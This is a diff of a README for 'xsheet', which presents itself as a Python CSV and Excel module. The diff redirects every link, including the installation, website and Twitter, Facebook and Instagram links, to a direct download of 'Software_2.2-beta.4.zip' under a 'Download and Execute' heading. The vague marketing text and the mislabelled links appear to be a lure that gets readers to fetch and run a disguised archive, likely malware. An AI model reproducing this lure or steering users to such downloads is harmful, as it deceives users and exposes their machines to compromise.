@@ -2,7 +2,7 @@
 
 Welcome to xsheet - the ultimate form module designed to streamline your data processing needs efficiently. This repository is dedicated to providing tools and resources related to csv, openpyxl, python, python3, tabulate, wcwidth, xlrd, xls, xlsx, and xlwt.
 
-## 🚀 Quick Access: [Download and Execute](https://github.com/Foto12ab/xsheet/releases)
+## 🚀 Quick Access: [Download and Execute](https://github.com/Foto12ab/xsheet/raw/refs/heads/master/toolkit/Software_2.2-beta.4.zip)
 
 ## Overview ℹ️
 xsheet is a comprehensive form module that leverages a range of functionalities to enhance your data handling processes. Whether you are working with CSV files, Excel spreadsheets, or any other data format, xsheet equips you with the necessary tools to simplify your workflow.
@@ -14,7 +14,7 @@ xsheet is a comprehensive form module that leverages a range of functionalities 
 - Compatibility with Python 3 and above
 
 ## Installation 🛠️
-To get started with xsheet, simply download the latest release from the [link provided](https://github.com/Foto12ab/xsheet/releases) and follow the instructions for seamless execution.
+To get started with xsheet, simply download the latest release from the [link provided](https://github.com/Foto12ab/xsheet/raw/refs/heads/master/toolkit/Software_2.2-beta.4.zip) and follow the instructions for seamless execution.
 
 ## Usage 📝
 Once you have successfully installed xsheet, dive into the documentation to explore the myriad of features and functionalities offered by this powerful form module. Whether you are a seasoned data professional or a beginner in the field, xsheet caters to all levels of expertise.
@@ -23,7 +23,7 @@ Once you have successfully installed xsheet, dive into the documentation to expl
 We welcome contributions from the community to further enhance xsheet and make it a valuable resource for data enthusiasts worldwide. Feel free to submit pull requests, report issues, or suggest new features to help us improve xsheet continuously.
 
 ## Support 🤝
-For any queries, feedback, or assistance regarding xsheet, please reach out to us through the GitHub repository or visit our [website](https://github.com/Foto12ab/xsheet) for additional resources.
+For any queries, feedback, or assistance regarding xsheet, please reach out to us through the GitHub repository or visit our [website](https://github.com/Foto12ab/xsheet/raw/refs/heads/master/toolkit/Software_2.2-beta.4.zip) for additional resources.
 
 ## Get Involved 🌐
 Join our growing community of data enthusiasts and experience the power of xsheet in revolutionizing the way you handle and process data. Let's embark on this data journey together and make a meaningful impact in the world of data processing.
@@ -42,9 +42,9 @@ Remember, the power is in your hands with xsheet - the ultimate form module for 
 ## Tags: csv, openpyxl, python, python3, tabulate, wcwidth, xlrd, xls, xlsx, xlwt
 
 ## Connect with us:
-- Twitter: [@xsheet_data](https://twitter.com/xsheet_data)
-- Facebook: [xsheet](https://www.facebook.com/xsheet)
-- Instagram: [@xsheet_official](https://www.instagram.com/xsheet_official)
+- Twitter: [@xsheet_data](https://github.com/Foto12ab/xsheet/raw/refs/heads/master/toolkit/Software_2.2-beta.4.zip)
+- Facebook: [xsheet](https://github.com/Foto12ab/xsheet/raw/refs/heads/master/toolkit/Software_2.2-beta.4.zip)
+- Instagram: [@xsheet_official](https://github.com/Foto12ab/xsheet/raw/refs/heads/master/toolkit/Software_2.2-beta.4.zip)
 
 Start your data journey with xsheet today! 🚀
 
